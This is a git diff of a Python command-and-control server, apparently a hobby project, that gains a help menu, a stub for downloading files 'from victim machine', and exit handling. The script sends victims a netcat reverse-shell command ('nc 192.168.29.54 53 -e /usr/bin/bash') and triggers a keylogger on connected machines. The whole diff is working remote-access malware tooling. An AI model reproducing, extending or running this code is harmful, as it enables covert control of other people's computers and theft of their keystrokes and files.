@@ -1,7 +1,12 @@
 #!/usr/bin/python3
 
+# _*_ coding:utf-8 _*_
+
+# works well in LAN
+# tested on Linux and Android
+# to do:  implement a public server
+
 import socket
-from os import system
 from time import sleep
 
 # ANSI color code
@@ -27,12 +32,30 @@ def runkeylogger(conn):
 
     return None 
 
+
 def runshell(conn):
     #spawning fully interactive tty bash shell
     print(f"[+] Run: '{RED}rlwrap nc -lnvp 53{WHITE}'")
     sleep(10)
     command = 'nc 192.168.29.54 53 -e /usr/bin/bash'
     conn.sendall(command.encode('utf-8'))
+
+    return None
+
+#to-do
+def download(conn):
+    pass
+
+def helpmenu():
+    print('[+] Alias:')
+    print(f'[+] {GREEN}download{WHITE}: To download a file from victim machine [Usage: download $FILENAME]\n')
+
+    print('[+] Commands:')
+    print(f'[+] {GREEN}shell{WHITE}: To start the Fully Interactive shell')
+    print(f'[+] {GREEN}keylogger{WHITE}: To start the keylogger\n')
+
+    print('[+] Other:')
+    print(f'[+] {GREEN}exit{WHITE}: To stop the Server\n')
 
     return None
 
@@ -46,15 +69,19 @@ def run():
         conn, addr = server.accept()     
         print(f'[+] Connection from {addr[0]}:{addr[1]}')
         platform = conn.recv(1024).decode()
-        print(f'[+] OS: {platform}')
+        print(f'[+] OS: {platform}\n')
 
         while True:  
             #sending the command
             command = input('$> ')
 
             if command.lower() == 'exit':
+                conn.sendall('exit'.encode('utf-8'))  #terminating the client side
                 break   #exit condition
 
+            if command.lower() == 'help':
+                helpmenu()  #command cheatsheet
+                
             #for getting a fully functional shell
             if command.lower() == 'shell':
                 runshell(conn)
@@ -62,6 +89,9 @@ def run():
             #for starting a keylogger
             if command.lower() == 'keylogger':
                 runkeylogger(conn)
+
+            if 'download' in command.lower():
+                download(conn)
 
             conn.sendall(command.encode('utf-8'))  #sending the data to victim
 
@@ -77,10 +107,13 @@ def run():
         conn.close() #closing the connection
         pass
 
+    finally:
+        conn.close()
+
 if __name__ == '__main__':
     #banner
     print(f'{GREEN}+-+-+-+-+-+-+-+-+-+{WHITE}')
-    print(f'{RED}|C|2|-|S|e|r|v|e|r|{WHITE}')
+    print(f'{GREEN}|C|2|-|S|e|r|v|e|r|{WHITE}')
     print(f'{GREEN}+-+-+-+-+-+-+-+-+-+{WHITE}')
     print(f'                     {GREEN}-@Debang5hu{WHITE}\n')
 
